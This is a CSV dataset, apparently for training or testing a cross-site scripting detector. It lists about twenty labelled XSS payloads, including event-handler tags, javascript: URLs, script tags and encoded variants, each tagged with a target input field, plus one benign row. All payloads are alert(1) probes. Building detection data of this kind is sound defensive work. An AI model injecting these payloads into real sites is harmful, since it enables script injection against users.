"payload","source","is_malicious","notes","input_field"
"<audio src=x onerror=alert(1)>","generated","True","event-based, <audio src=x onerror","search_bar"
"<iframe onload=alert(1)>","generated","True","event-based, <iframe onload=alert","comments"
"<details open ontoggle=alert(1)>","generated","True","event-based, <details open ontogg","search_bar"
"<img src=invalid onerror=alert(1)>","generated","True","event-based, <img src=invalid one","search_bar"
""" onmouseover=alert(1)","generated","True","event-based, "" onmouseover=alert(","comments"
"%3Cimg%20src=x%20onerror=alert(1)%3E","generated","True","event-based, %3Cimg%20src=x%20one","search_bar"
"<div onclick=alert(1)>Click</div>","generated","True","event-based, <div onclick=alert(1","search_bar"
"<img src=x onerror=alert(1)>","generated","True","event-based, <img src=x onerror=a","search_bar"
"<textarea onfocus=alert(1) autofocus>","generated","True","event-based, <textarea onfocus=al","search_bar"
"<object data=javascript:alert(1)>","generated","True","dom-based, <object data=javascr","comments"
"""><img src=x onerror=alert(1)>","generated","True","event-based, ""><img src=x onerror","search_bar"
"<input onfocus=alert(1) autofocus>","generated","True","event-based, <input onfocus=alert","search_bar"
"&#60;img src=x onerror=alert(1)&#62;","generated","True","event-based, &#60;img src=x onerr","search_bar"
"<video src=x onerror=alert(1)>","generated","True","event-based, <video src=x onerror","search_bar"
"<button onclick=alert(1)>Click</button>","generated","True","event-based, <button onclick=aler","search_bar"
"javascript:alert(1)","generated","True","dom-based, javascript:alert(1)","comments"
"<marquee onstart=alert(1)>","generated","True","event-based, <marquee onstart=ale","search_bar"
"<select onchange=alert(1)>","generated","True","event-based, <select onchange=ale","search_bar"
"<a href=javascript:alert(1)>Click</a>","generated","True","dom-based, <a href=javascript:a","comments"
"<script>alert(1)</script>","generated","True","script-based, <script>alert(1)</sc","profile_bio"
"Hello World","generated","False","Non-malicious text","search_bar"
